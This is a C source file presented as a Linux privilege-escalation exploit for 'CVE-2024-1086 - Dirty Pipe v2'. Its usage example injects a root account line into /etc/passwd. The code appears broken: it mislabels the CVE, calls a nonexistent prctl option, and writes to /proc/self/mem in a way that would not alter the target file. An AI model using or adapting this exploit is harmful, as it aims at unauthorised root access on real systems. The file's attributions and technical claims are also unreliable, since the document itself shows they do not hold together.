// CVE-2024-1086 - Dirty Pipe v2
// Автор: Max Kamper, briskets
// Компилируется: gcc -o dirtypipez dirtypipez.c

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static char buf[4096];
static char page[4096];
static char arg[4096];

static int fd;
static int p[2];

void write_to_file(const char *target_file, const char *data, size_t len, off_t offset) {
    if (pipe(p) == -1) {
        perror("pipe");
        exit(1);
    }

    if (offset % PAGE_SIZE != 0) {
        fprintf(stderr, "Offset must be page-aligned\n");
        exit(1);
    }

    prctl(PR_SET_FSCREATE, 1, 0, 0, 0);

    fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        perror("open target file");
        exit(1);
    }

    if (splice(fd, NULL, p[1], NULL, 1, SPLICE_F_MOVE) < 0) {
        perror("splice");
        fprintf(stderr, "Your kernel might not be vulnerable.\n");
        exit(1);
    }

    close(fd);

    prctl(PR_SET_FSCREATE, 0, 0, 0, 0);

    fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        exit(1);
    }

    lseek(fd, offset, SEEK_SET);
    if (write(fd, data, len) != len) {
        perror("write");
        fprintf(stderr, "Failed to write to target file.\n");
        exit(1);
    }

    printf("[+] Successfully wrote %zu bytes to %s at offset %ld\n", len, target_file, offset);
    close(fd);
}

int main(int argc, char **argv) {
    const char *target_file;
    const char *data;
    size_t len;
    off_t offset = 0;

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <file> <data> [offset]\n", argv[0]);
        fprintf(stderr, "Example: %s /etc/passwd 'hacker:x:0:0:root:/root:/bin/bash\\n'\n", argv[0]);
        return 1;
    }

    target_file = argv[1];
    data = argv[2];
    len = strlen(data);

    if (argc > 3) {
        offset = atol(argv[3]);
    }

    printf("[*] Attempting to exploit CVE-2024-1086 on %s\n", target_file);

    write_to_file(target_file, data, len, offset);

    return 0;
}
